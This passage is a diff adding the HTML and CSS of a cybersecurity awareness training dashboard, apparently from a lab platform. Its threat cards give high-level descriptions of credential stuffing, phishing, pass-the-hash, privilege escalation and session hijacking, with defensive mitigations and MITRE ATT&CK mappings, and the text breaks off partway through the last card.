@@ -1,0 +1,2084 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CyberForge Labs | Threat Intelligence & Awareness</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg-deep: #05020c;
+            --bg-card: rgba(13, 9, 26, 0.7);
+            --bg-sidebar: #020108;
+            --border-color: #1f1533;
+            --text-primary: #f3f4f6;
+            --text-muted: #948fa3;
+            --cyan-glow: #38bdf8;
+            --purple-accent: #a855f7;
+            --green-glow: #10b981;
+            --red-glow: #ef4444;
+            --amber-glow: #f59e0b;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            background-color: var(--bg-deep);
+            color: var(--text-primary);
+            font-family: 'Inter', sans-serif;
+            display: flex;
+            height: 100vh;
+            overflow: hidden;
+            position: relative;
+        }
+
+        /* Floating Particle Background Canvas */
+        #particlesCanvas {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 1;
+            pointer-events: none;
+        }
+
+        /* Sidebar Navigation */
+        .sidebar {
+            width: 260px;
+            background-color: var(--bg-sidebar);
+            border-right: 1px solid var(--border-color);
+            display: flex;
+            flex-direction: column;
+            padding: 20px;
+            flex-shrink: 0;
+            overflow-y: auto;
+            z-index: 2;
+        }
+
+        .logo-area {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 22px;
+            font-weight: 700;
+            color: var(--green-glow);
+            margin-bottom: 30px;
+        }
+
+        .nav-group {
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+            margin-bottom: 25px;
+        }
+
+        .nav-item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 10px 12px;
+            color: var(--text-muted);
+            text-decoration: none;
+            font-size: 14px;
+            border-radius: 6px;
+            transition: all 0.2s ease;
+        }
+
+        .nav-item:hover,
+        .nav-item.active {
+            background-color: rgba(16, 185, 129, 0.08);
+            color: var(--green-glow);
+        }
+
+        .infra-section {
+            margin-top: auto;
+            border-top: 1px solid var(--border-color);
+            padding-top: 20px;
+        }
+
+        .infra-title {
+            font-size: 12px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+            color: var(--text-primary);
+            margin-bottom: 12px;
+        }
+
+        .infra-item {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 13px;
+            color: var(--text-muted);
+            margin-bottom: 8px;
+        }
+
+        .status-dot {
+            width: 10px;
+            height: 10px;
+            background-color: var(--green-glow);
+            border-radius: 50%;
+            box-shadow: 0 0 8px var(--green-glow);
+        }
+
+        /* Workspace Grid */
+        .workspace {
+            display: flex;
+            flex-direction: column;
+            flex: 1;
+            height: 100vh;
+            overflow-y: auto;
+            z-index: 2;
+            padding: 30px;
+            background: linear-gradient(180deg, rgba(5,2,12,0.6) 0%, rgba(2,1,8,0.9) 100%);
+        }
+
+        /* Header Control HUD Panel */
+        .page-header {
+            margin-bottom: 30px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 20px;
+        }
+
+        .header-title h1 {
+            font-size: 26px;
+            font-weight: 800;
+            color: #fff;
+            letter-spacing: 0.5px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .header-title h1 i {
+            color: var(--purple-accent);
+            text-shadow: 0 0 10px rgba(168, 85, 247, 0.4);
+        }
+
+        .header-title p {
+            font-size: 14px;
+            color: var(--text-muted);
+            margin-top: 5px;
+        }
+
+        /* Threat Matrix counts & Progress HUD */
+        .matrix-hud {
+            display: flex;
+            gap: 15px;
+            flex-wrap: wrap;
+        }
+
+        .matrix-card {
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 12px 20px;
+            min-width: 120px;
+            text-align: center;
+            backdrop-filter: blur(12px);
+        }
+
+        .matrix-card .val {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 20px;
+            font-weight: 700;
+            display: block;
+            margin-bottom: 3px;
+        }
+
+        .matrix-card.critical .val { color: var(--red-glow); text-shadow: 0 0 8px rgba(239, 68, 68, 0.3); }
+        .matrix-card.high .val { color: var(--amber-glow); text-shadow: 0 0 8px rgba(245, 158, 11, 0.3); }
+        .matrix-card.medium .val { color: var(--cyan-glow); text-shadow: 0 0 8px rgba(56, 189, 248, 0.3); }
+
+        .matrix-card .lbl {
+            font-size: 10px;
+            font-weight: 700;
+            text-transform: uppercase;
+            color: var(--text-muted);
+            letter-spacing: 0.5px;
+        }
+
+        .progress-hud-card {
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 12px 20px;
+            min-width: 250px;
+            backdrop-filter: blur(12px);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .progress-hud-header {
+            display: flex;
+            justify-content: space-between;
+            font-size: 11px;
+            font-weight: 700;
+            text-transform: uppercase;
+            color: var(--text-muted);
+        }
+
+        .progress-hud-bar-bg {
+            height: 8px;
+            background: #18112b;
+            border-radius: 4px;
+            overflow: hidden;
+            width: 100%;
+        }
+
+        .progress-hud-bar-fill {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, var(--purple-accent), var(--cyan-glow));
+            box-shadow: 0 0 10px var(--cyan-glow);
+            transition: width 0.4s ease;
+        }
+
+        /* Filter Controls Draw */
+        .controls-tray {
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 35px;
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            backdrop-filter: blur(12px);
+        }
+
+        .search-row {
+            display: flex;
+            gap: 15px;
+        }
+
+        .search-box-wrapper {
+            flex: 1;
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+
+        .search-box-wrapper i {
+            position: absolute;
+            left: 15px;
+            color: var(--text-muted);
+            font-size: 14px;
+        }
+
+        .search-input {
+            width: 100%;
+            background: #0b0717;
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            color: #fff;
+            padding: 12px 15px 12px 45px;
+            font-size: 14px;
+            outline: none;
+            transition: all 0.2s;
+        }
+
+        .search-input:focus {
+            border-color: var(--purple-accent);
+            box-shadow: 0 0 10px rgba(168, 85, 247, 0.2);
+        }
+
+        .filter-row {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            flex-wrap: wrap;
+            font-size: 13px;
+        }
+
+        .filter-label {
+            font-weight: 700;
+            color: var(--text-muted);
+            text-transform: uppercase;
+            font-size: 11px;
+            letter-spacing: 0.5px;
+        }
+
+        .filter-group {
+            display: flex;
+            gap: 8px;
+            flex-wrap: wrap;
+        }
+
+        .filter-btn {
+            background: #110924;
+            border: 1px solid var(--border-color);
+            color: var(--text-muted);
+            padding: 6px 14px;
+            border-radius: 6px;
+            font-size: 12px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .filter-btn:hover {
+            color: #fff;
+            background: #1c103a;
+        }
+
+        .filter-btn.active {
+            background: var(--purple-accent);
+            color: #fff;
+            border-color: var(--purple-accent);
+            box-shadow: 0 0 10px rgba(168, 85, 247, 0.3);
+        }
+
+        /* Threat intelligence containers */
+        .category-section {
+            margin-bottom: 40px;
+        }
+
+        .category-section.hidden {
+            display: none;
+        }
+
+        .category-header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            border-bottom: 1px solid var(--border-color);
+            padding-bottom: 12px;
+            margin-bottom: 25px;
+        }
+
+        .category-header i {
+            font-size: 22px;
+            color: var(--cyan-glow);
+            text-shadow: 0 0 10px rgba(56, 189, 248, 0.3);
+        }
+
+        .category-header h2 {
+            font-size: 18px;
+            font-weight: 800;
+            color: #fff;
+            letter-spacing: 0.5px;
+        }
+
+        /* Responsive Grid of Cards */
+        .threat-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(360px, 1fr));
+            gap: 25px;
+        }
+
+        /* Glassmorphism Card Layout */
+        .threat-card {
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+            backdrop-filter: blur(12px);
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .threat-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 3px;
+            background: transparent;
+            transition: background 0.3s;
+        }
+
+        /* Neon Glow Severities colors */
+        .threat-card[data-severity="Critical"]::before { background: var(--red-glow); }
+        .threat-card[data-severity="High"]::before { background: var(--amber-glow); }
+        .threat-card[data-severity="Medium"]::before { background: var(--cyan-glow); }
+
+        .threat-card:hover {
+            transform: translateY(-5px);
+            background: rgba(23, 16, 43, 0.85);
+            border-color: rgba(168, 85, 247, 0.4);
+        }
+
+        .threat-card[data-severity="Critical"]:hover { box-shadow: 0 5px 25px rgba(239, 68, 68, 0.15); }
+        .threat-card[data-severity="High"]:hover { box-shadow: 0 5px 25px rgba(245, 158, 11, 0.15); }
+        .threat-card[data-severity="Medium"]:hover { box-shadow: 0 5px 25px rgba(56, 189, 248, 0.15); }
+
+        /* Card Header */
+        .card-header-top {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .card-icon-title {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .card-icon-title i {
+            font-size: 20px;
+            color: var(--purple-accent);
+        }
+
+        .card-icon-title h3 {
+            font-size: 15px;
+            font-weight: 700;
+            color: #fff;
+            line-height: 1.2;
+        }
+
+        .sev-badge {
+            font-size: 9px;
+            font-weight: 800;
+            text-transform: uppercase;
+            padding: 3px 8px;
+            border-radius: 4px;
+            letter-spacing: 0.5px;
+        }
+
+        .sev-badge.critical { background: rgba(239, 68, 68, 0.15); color: var(--red-glow); border: 1px solid rgba(239, 68, 68, 0.3); }
+        .sev-badge.high { background: rgba(245, 158, 11, 0.15); color: var(--amber-glow); border: 1px solid rgba(245, 158, 11, 0.3); }
+        .sev-badge.medium { background: rgba(56, 189, 248, 0.15); color: var(--cyan-glow); border: 1px solid rgba(56, 189, 248, 0.3); }
+
+        /* Card Middle */
+        .threat-desc {
+            font-size: 13px;
+            color: var(--text-muted);
+            line-height: 1.5;
+        }
+
+        .threat-impact-box {
+            background: rgba(0, 0, 0, 0.2);
+            border: 1px solid rgba(255, 255, 255, 0.02);
+            border-radius: 6px;
+            padding: 10px 14px;
+            font-size: 12px;
+        }
+
+        .threat-impact-box strong {
+            color: var(--cyan-glow);
+            font-weight: 600;
+            display: block;
+            margin-bottom: 4px;
+        }
+
+        .threat-impact-box p {
+            color: #d1d5db;
+            line-height: 1.4;
+        }
+
+        /* Mitigation Accordion */
+        .mitigation-accordion {
+            border: 1px solid var(--border-color);
+            border-radius: 6px;
+            background: rgba(15, 9, 31, 0.4);
+            overflow: hidden;
+        }
+
+        .accordion-header {
+            padding: 10px 14px;
+            font-size: 12px;
+            font-weight: 700;
+            color: #fff;
+            cursor: pointer;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background: rgba(255, 255, 255, 0.02);
+        }
+
+        .accordion-header i {
+            transition: transform 0.2s;
+            color: var(--purple-accent);
+        }
+
+        .accordion-body {
+            max-height: 0;
+            overflow: hidden;
+            transition: max-height 0.2s ease-out;
+        }
+
+        .accordion-body ul {
+            padding: 12px 25px;
+            font-size: 12px;
+            color: var(--text-muted);
+            line-height: 1.7;
+        }
+
+        .accordion-body ul li {
+            margin-bottom: 4px;
+        }
+
+        /* Expand Details Button */
+        .card-footer-controls {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 5px;
+            gap: 10px;
+        }
+
+        .expand-details-btn {
+            background: transparent;
+            border: 1px solid rgba(168, 85, 247, 0.3);
+            color: var(--purple-accent);
+            padding: 6px 12px;
+            border-radius: 6px;
+            font-size: 11px;
+            font-weight: 700;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            transition: all 0.2s;
+        }
+
+        .expand-details-btn:hover {
+            background: rgba(168, 85, 247, 0.1);
+            border-color: var(--purple-accent);
+        }
+
+        .completion-checkbox-wrapper {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 12px;
+            font-weight: 600;
+            color: var(--text-muted);
+            cursor: pointer;
+            user-select: none;
+        }
+
+        .completion-checkbox-wrapper input {
+            cursor: pointer;
+            accent-color: var(--green-glow);
+        }
+
+        /* Expandable threat details panel */
+        .intel-details-panel {
+            max-height: 0;
+            overflow: hidden;
+            transition: max-height 0.3s ease-out;
+            background: #020106;
+            border-radius: 6px;
+            border: 1px dashed var(--border-color);
+            margin-top: 10px;
+        }
+
+        .intel-details-panel-inner {
+            padding: 15px;
+            font-size: 12px;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .intel-title {
+            font-size: 11px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            color: var(--cyan-glow);
+            font-weight: 700;
+            border-bottom: 1px solid var(--border-color);
+            padding-bottom: 4px;
+            margin-bottom: 5px;
+        }
+
+        .intel-row {
+            display: grid;
+            grid-template-columns: 1fr 1.5fr;
+            gap: 10px;
+        }
+
+        .intel-col strong {
+            display: block;
+            margin-bottom: 2px;
+            color: #fff;
+        }
+
+        .intel-col span {
+            color: var(--text-muted);
+        }
+
+        /* Animated ASCII Flow Charts / Diagrams */
+        .ascii-diagram-wrapper {
+            background: #07040d;
+            border: 1px solid rgba(255, 255, 255, 0.02);
+            border-radius: 4px;
+            padding: 10px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 10px;
+            color: var(--cyan-glow);
+            overflow-x: auto;
+            white-space: pre;
+            line-height: 1.3;
+        }
+
+        /* SVG Diagrams styles */
+        .threat-svg-diagram {
+            width: 100%;
+            height: 70px;
+            background: #07040d;
+            border-radius: 4px;
+            display: block;
+        }
+
+        .killchain-track {
+            display: flex;
+            justify-content: space-between;
+            gap: 5px;
+            position: relative;
+            margin: 10px 0;
+        }
+
+        .killchain-track::before {
+            content: '';
+            position: absolute;
+            top: 12px;
+            left: 10px;
+            right: 10px;
+            height: 2px;
+            background: #18112b;
+            z-index: 1;
+        }
+
+        .killchain-node {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 5px;
+            z-index: 2;
+            flex: 1;
+            text-align: center;
+        }
+
+        .killchain-dot {
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            background: #0f0b1a;
+            border: 2px solid var(--border-color);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 10px;
+            font-weight: 700;
+            color: var(--text-muted);
+        }
+
+        .killchain-node.active .killchain-dot {
+            background: var(--purple-accent);
+            border-color: var(--purple-accent);
+            color: #fff;
+            box-shadow: 0 0 8px var(--purple-accent);
+        }
+
+        .killchain-node.active span {
+            color: #fff;
+            font-weight: 600;
+        }
+
+        .killchain-node span {
+            font-size: 8px;
+            text-transform: uppercase;
+            color: var(--text-muted);
+        }
+
+    </style>
+</head>
+<body>
+
+    <!-- Floating Cyber Particles Canvas -->
+    <canvas id="particlesCanvas"></canvas>
+
+    <!-- LEFT SIDEBAR: EXACT MATCH TO SCREENSHOT PATTERNS -->
+    <div class="sidebar">
+        <div class="logo-area">
+            <i class="fa-solid fa-shield-halved"></i> CyberForge
+        </div>
+
+        <nav class="nav-group">
+            <a href="/dashboard" class="nav-item"><i class="fa-solid fa-chart-line"></i> Dashboard</a>
+            <a href="/hacker" class="nav-item"><i class="fa-solid fa-terminal"></i> Hacker Interface</a>
+            <a href="/victim" class="nav-item"><i class="fa-solid fa-desktop"></i> Victim Interface</a>
+            <a href="/labs/defensive" class="nav-item"><i class="fa-solid fa-flask"></i> Threat Lab Center</a>
+            <a href="/packet_sniffer" class="nav-item"><i class="fa-solid fa-network-wired"></i> Packet Sniffer</a>
+            <a href="/password_analyzer" class="nav-item"><i class="fa-solid fa-key"></i> Password Analyzer</a>
+            <a href="/ai_copilot" class="nav-item"><i class="fa-solid fa-robot"></i> AI Cyber Copilot</a>
+            <a href="/academy" class="nav-item"><i class="fa-solid fa-graduation-cap"></i> Cyber Defense Academy</a>
+            <a href="/report" class="nav-item"><i class="fa-solid fa-file-pdf"></i> Generate Report</a>
+            <a href="/awareness" class="nav-item active"><i class="fa-solid fa-graduation-cap"></i> Cyber Safety Awareness</a>
+            <a href="/scenario_engine" class="nav-item"><i class="fa-solid fa-gamepad"></i> Scenario Engine</a>
+            <a href="/gamification" class="nav-item"><i class="fa-solid fa-trophy"></i> Gamification</a>
+            <a href="/siem_center" class="nav-item"><i class="fa-solid fa-server"></i> SIEM Center</a>
+            <a href="/ai_mentor" class="nav-item"><i class="fa-solid fa-graduation-cap"></i> AI Mentor Mode</a>
+            <a href="/report_center" class="nav-item"><i class="fa-solid fa-folder-open"></i> Report Center</a>
+            <a href="/logout" class="nav-item"><i class="fa-solid fa-right-from-bracket"></i> Logout</a>
+        </nav>
+
+        <div class="infra-section">
+            <div class="infra-title">Infrastructure</div>
+            <div class="infra-item">
+                <div class="status-dot"></div> Kali Linux
+            </div>
+            <div class="infra-item">
+                <div class="status-dot"></div> Metasploitable
+            </div>
+            <div class="infra-item">
+                <div class="status-dot"></div> Flask Server
+            </div>
+            <div class="infra-item">
+                <div class="status-dot"></div> SQLite Database
+            </div>
+        </div>
+    </div>
+
+    <!-- MAIN DASHBOARD SPACE -->
+    <div class="workspace">
+        
+        <!-- Page Header & Metrics HUD -->
+        <header class="page-header">
+            <div class="header-title">
+                <h1><i class="fa-solid fa-globe"></i> Cyber Safety Awareness</h1>
+                <p>Enterprise Threat Intelligence & Defensive Training Console</p>
+            </div>
+            
+            <div class="matrix-hud">
+                <div class="matrix-card critical">
+                    <span class="val" id="countCritical">8</span>
+                    <span class="lbl">Critical</span>
+                </div>
+                <div class="matrix-card high">
+                    <span class="val" id="countHigh">8</span>
+                    <span class="lbl">High</span>
+                </div>
+                <div class="matrix-card medium">
+                    <span class="val" id="countMedium">4</span>
+                    <span class="lbl">Medium</span>
+                </div>
+                <div class="progress-hud-card">
+                    <div class="progress-hud-header">
+                        <span>Training Progress</span>
+                        <span id="progressStatsText">0 / 20 THREATS</span>
+                    </div>
+                    <div class="progress-hud-bar-bg">
+                        <div class="progress-hud-bar-fill" id="progressFillBar"></div>
+                    </div>
+                </div>
+            </div>
+        </header>
+
+        <!-- Controls Bar Draw (Search & Filter) -->
+        <div class="controls-tray">
+            <div class="search-row">
+                <div class="search-box-wrapper">
+                    <i class="fa-solid fa-magnifying-glass"></i>
+                    <input type="text" id="threatSearchInput" class="search-input" placeholder="Search threats, tactics, mitigations, or mappings..." oninput="filterThreats()">
+                </div>
+            </div>
+            <div class="filter-row">
+                <span class="filter-label">Severity:</span>
+                <div class="filter-group" id="sevFilters">
+                    <button class="filter-btn active" data-value="All" onclick="setSevFilter('All')">All</button>
+                    <button class="filter-btn" data-value="Critical" onclick="setSevFilter('Critical')">Critical</button>
+                    <button class="filter-btn" data-value="High" onclick="setSevFilter('High')">High</button>
+                    <button class="filter-btn" data-value="Medium" onclick="setSevFilter('Medium')">Medium</button>
+                </div>
+                <span class="filter-label" style="margin-left: 20px;">Category:</span>
+                <div class="filter-group" id="catFilters">
+                    <button class="filter-btn active" data-value="All" onclick="setCatFilter('All')">All Categories</button>
+                    <button class="filter-btn" data-value="identity" onclick="setCatFilter('identity')">Identity & Access</button>
+                    <button class="filter-btn" data-value="web" onclick="setCatFilter('web')">Web Vulnerabilities</button>
+                    <button class="filter-btn" data-value="network" onclick="setCatFilter('network')">Network & Infra</button>
+                    <button class="filter-btn" data-value="malware" onclick="setCatFilter('malware')">Malware & System</button>
+                    <button class="filter-btn" data-value="cloud" onclick="setCatFilter('cloud')">Cloud Security</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- SECTION 1: IDENTITY & ACCESS ATTACKS -->
+        <section class="category-section" data-category="identity" id="sec-identity">
+            <div class="category-header">
+                <i class="fa-solid fa-user-shield"></i>
+                <h2>Identity & Access Attacks</h2>
+            </div>
+            <div class="threat-grid">
+                
+                <!-- Card 1 -->
+                <article class="threat-card" data-severity="High" data-category="identity">
+                    <div class="card-header-top">
+                        <div class="card-icon-title">
+                            <i class="fa-solid fa-shield-halved"></i>
+                            <h3>Credential Stuffing & Brute Force</h3>
+                        </div>
+                        <span class="sev-badge high">High</span>
+                    </div>
+                    <div class="threat-desc">
+                        Automated bots test leaked password pairs or guess combinations systematically to hijack user sessions.
+                    </div>
+                    <div class="threat-impact-box">
+                        <strong>Real World Impact</strong>
+                        <p>Unauthorized user hijack, automated account takeover (ATO), and sensitive information leakage.</p>
+                    </div>
+                    <div class="mitigation-accordion">
+                        <div class="accordion-header" onclick="toggleAccordion(this)">
+                            Defensive Mitigations <i class="fa-solid fa-chevron-down"></i>
+                        </div>
+                        <div class="accordion-body">
+                            <ul>
+                                <li>Enforce Multi-Factor Authentication (MFA)</li>
+                                <li>Implement rate limiting on authentication routes</li>
+                                <li>Deploy Google CAPTCHAs or security tokens</li>
+                                <li>Analyze anomalous geo-IP source logins</li>
+                            </ul>
+                        </div>
+                    </div>
+                    <div class="card-footer-controls">
+                        <button class="expand-details-btn" onclick="toggleIntelPanel(this)">
+                            <i class="fa-solid fa-circle-info"></i> Intel details
+                        </button>
+                        <label class="completion-checkbox-wrapper">
+                            <input type="checkbox" class="completed-chk" onclick="updateTrackingProgress()"> Completed
+                        </label>
+                    </div>
+                    <div class="intel-details-panel">
+                        <div class="intel-details-panel-inner">
+                            <div class="intel-title">Mitre Att&ck & Timeline</div>
+                            <div class="intel-row">
+                                <div class="intel-col"><strong>Technique</strong><span>T1110 (Brute Force)</span></div>
+                                <div class="intel-col"><strong>Tactic</strong><span>Credential Access</span></div>
+                            </div>
+                            <div class="killchain-track">
+                                <div class="killchain-node active"><div class="killchain-dot">RC</div><span>Recon</span></div>
+                                <div class="killchain-node active"><div class="killchain-dot">ST</div><span>Stuff</span></div>
+                                <div class="killchain-node"><div class="killchain-dot">IA</div><span>Access</span></div>
+                                <div class="killchain-node"><div class="killchain-dot">EX</div><span>Exfil</span></div>
+                            </div>
+                        </div>
+                    </div>
+                </article>
+
+                <!-- Card 2 -->
+                <article class="threat-card" data-severity="Critical" data-category="identity">
+                    <div class="card-header-top">
+                        <div class="card-icon-title">
+                            <i class="fa-solid fa-envelope-open-text"></i>
+                            <h3>Phishing & Social Engineering</h3>
+                        </div>
+                        <span class="sev-badge critical">Critical</span>
+                    </div>
+                    <div class="threat-desc">
+                        Deceptive emails, SMS (Smishing), or voice calls (Vishing) trick operators into revealing keys or executing malicious packages.
+                    </div>
+                    <div class="threat-impact-box">
+                        <strong>Real World Impact</strong>
+                        <p>Total corporate system compromise, initial entry vectors for malware, and credential theft.</p>
+                    </div>
+                    <div class="mitigation-accordion">
+                        <div class="accordion-header" onclick="toggleAccordion(this)">
+                            Defensive Mitigations <i class="fa-solid fa-chevron-down"></i>
+                        </div>
+                        <div class="accordion-body">
+                            <ul>
+                                <li>Enforce strict DMARC, DKIM, and SPF filters</li>
+                                <li>Utilize secure email gateway scrubbers</li>
+                                <li>Conduct quarterly test simulation drills</li>
+                                <li>Isolate external web portals in sandbox pools</li>
+                            </ul>
+                        </div>
+                    </div>
+                    <div class="card-footer-controls">
+                        <button class="expand-details-btn" onclick="toggleIntelPanel(this)">
+                            <i class="fa-solid fa-circle-info"></i> Intel details
+                        </button>
+                        <label class="completion-checkbox-wrapper">
+                            <input type="checkbox" class="completed-chk" onclick="updateTrackingProgress()"> Completed
+                        </label>
+                    </div>
+                    <div class="intel-details-panel">
+                        <div class="intel-details-panel-inner">
+                            <div class="intel-title">Mitre Att&ck & Timeline</div>
+                            <div class="intel-row">
+                                <div class="intel-col"><strong>Technique</strong><span>T1566 (Phishing)</span></div>
+                                <div class="intel-col"><strong>Tactic</strong><span>Initial Access</span></div>
+                            </div>
+                            <div class="killchain-track">
+                                <div class="killchain-node active"><div class="killchain-dot">DL</div><span>Delivery</span></div>
+                                <div class="killchain-node active"><div class="killchain-dot">EX</div><span>Exploit</span></div>
+                                <div class="killchain-node"><div class="killchain-dot">IN</div><span>Install</span></div>
+                                <div class="killchain-node"><div class="killchain-dot">C2</div><span>Control</span></div>
+                            </div>
+                        </div>
+                    </div>
+                </article>
+
+                <!-- Card 3 -->
+                <article class="threat-card" data-severity="Critical" data-category="identity">
+                    <div class="card-header-top">
+                        <div class="card-icon-title">
+                            <i class="fa-solid fa-key"></i>
+                            <h3>Pass-the-Hash / Pass-the-Ticket</h3>
+                        </div>
+                        <span class="sev-badge critical">Critical</span>
+                    </div>
+                    <div class="threat-desc">
+                        Threat actors extract cached NTLM password hashes or Kerberos tickets to hop laterally without crack/plaintext logic checks.
+                    </div>
+                    <div class="threat-impact-box">
+                        <strong>Real World Impact</strong>
+                        <p>Lateral mobility across target domains and Active Directory directory takeover.</p>
+                    </div>
+                    <div class="mitigation-accordion">
+                        <div class="accordion-header" onclick="toggleAccordion(this)">
+                            Defensive Mitigations <i class="fa-solid fa-chevron-down"></i>
+                        </div>
+                        <div class="accordion-body">
+                            <ul>
+                                <li>Enable Windows Defender Credential Guard protection</li>
+                                <li>Implement strict Local Administrator boundaries</li>
+                                <li>Secure Active Directory service tickets hashes</li>
+                                <li>Deploy alerts for unusual Kerberos tickets</li>
+                            </ul>
+                        </div>
+                    </div>
+                    <div class="card-footer-controls">
+                        <button class="expand-details-btn" onclick="toggleIntelPanel(this)">
+                            <i class="fa-solid fa-circle-info"></i> Intel details
+                        </button>
+                        <label class="completion-checkbox-wrapper">
+                            <input type="checkbox" class="completed-chk" onclick="updateTrackingProgress()"> Completed
+                        </label>
+                    </div>
+                    <div class="intel-details-panel">
+                        <div class="intel-details-panel-inner">
+                            <div class="intel-title">Mitre Att&ck & Timeline</div>
+                            <div class="intel-row">
+                                <div class="intel-col"><strong>Technique</strong><span>T1550 (Use Alternate Authentication Material)</span></div>
+                                <div class="intel-col"><strong>Tactic</strong><span>Lateral Movement</span></div>
+                            </div>
+                            <div class="killchain-track">
+                                <div class="killchain-node active"><div class="killchain-dot">EX</div><span>Extract</span></div>
+                                <div class="killchain-node active"><div class="killchain-dot">IN</div><span>Inject</span></div>
+                                <div class="killchain-node active"><div class="killchain-dot">LM</div><span>Lateral</span></div>
+                                <div class="killchain-node"><div class="killchain-dot">DA</div><span>Domain</span></div>
+                            </div>
+                        </div>
+                    </div>
+                </article>
+
+                <!-- Card 4 -->
+                <article class="threat-card" data-severity="Critical" data-category="identity">
+                    <div class="card-header-top">
+                        <div class="card-icon-title">
+                            <i class="fa-solid fa-arrow-up-from-bracket"></i>
+                            <h3>Privilege Escalation</h3>
+                        </div>
+                        <span class="sev-badge critical">Critical</span>
+                    </div>
+                    <div class="threat-desc">
+                        Abuse of kernel vulnerabilities or misconfigurations to elevate limited permissions to root/administrator level access.
+                    </div>
+                    <div class="threat-impact-box">
+                        <strong>Real World Impact</strong>
+                        <p>Attacker gains absolute control over the machine, installs system services, and turns off telemetry logging.</p>
+                    </div>
+                    <div class="mitigation-accordion">
+                        <div class="accordion-header" onclick="toggleAccordion(this)">
+                            Defensive Mitigations <i class="fa-solid fa-chevron-down"></i>
+                        </div>
+                        <div class="accordion-body">
+                            <ul>
+                                <li>Enforce the Principle of Least Privilege (PoLP)</li>
+                                <li>Regularly scan and patch operating system software</li>
+                                <li>Monitor registry alterations and task scheduler edits</li>
+                                <li>Audit system service configuration parameters</li>
+                            </ul>
+                        </div>
+                    </div>
+                    <div class="card-footer-controls">
+                        <button class="expand-details-btn" onclick="toggleIntelPanel(this)">
+                            <i class="fa-solid fa-circle-info"></i> Intel details
+                        </button>
+                        <label class="completion-checkbox-wrapper">
+                            <input type="checkbox" class="completed-chk" onclick="updateTrackingProgress()"> Completed
+                        </label>
+                    </div>
+                    <div class="intel-details-panel">
+                        <div class="intel-details-panel-inner">
+                            <div class="intel-title">Mitre Att&ck & Timeline</div>
+                            <div class="intel-row">
+                                <div class="intel-col"><strong>Technique</strong><span>T1068 (Exploitation for Privilege Escalation)</span></div>
+                                <div class="intel-col"><strong>Tactic</strong><span>Privilege Escalation</span></div>
+                            </div>
+                            <div class="killchain-track">
+                                <div class="killchain-node active"><div class="killchain-dot">EN</div><span>Entry</span></div>
+                                <div class="killchain-node active"><div class="killchain-dot">ES</div><span>Escalate</span></div>
+                                <div class="killchain-node"><div class="killchain-dot">AD</div><span>Admin</span></div>
+                                <div class="killchain-node"><div class="killchain-dot">PT</div><span>Persist</span></div>
+                            </div>
+                        </div>
+                    </div>
+                </article>
+
+                <!-- Card 5 -->
+                <article class="threat-card" data-severity="High" data-category="identity">
+                    <div class="card-header-top">
+                        <div class="card-icon-title">
+                            <i class="fa-solid fa-cookie-bite"></i>
+                            <h3>Session Hijacking</h3>
+                        </div>
+                        <span class="sev-badge high">High</span>
+                    </div>
+                    <div class="threat-desc">
+                        Threat actors steal authenticated session state cookies to access systems pretending to be the user, bypassing authentication check loops.
+                    </div>
+                    <div class="threat-impact-box">
+                        <strong>Real World Impact</strong>
+                        <p>Unauthorized database access, session impersonation, and multi-factor auth bypassing.</p>
+                    </div>
+                    <div class="mitigation-accordion">
+                        <div class="accordion-header" onclick="toggleAccordion(this)">
+                            Defensive Mitigations <i class="fa-solid fa-chevron-down"></i>
+                        </div>
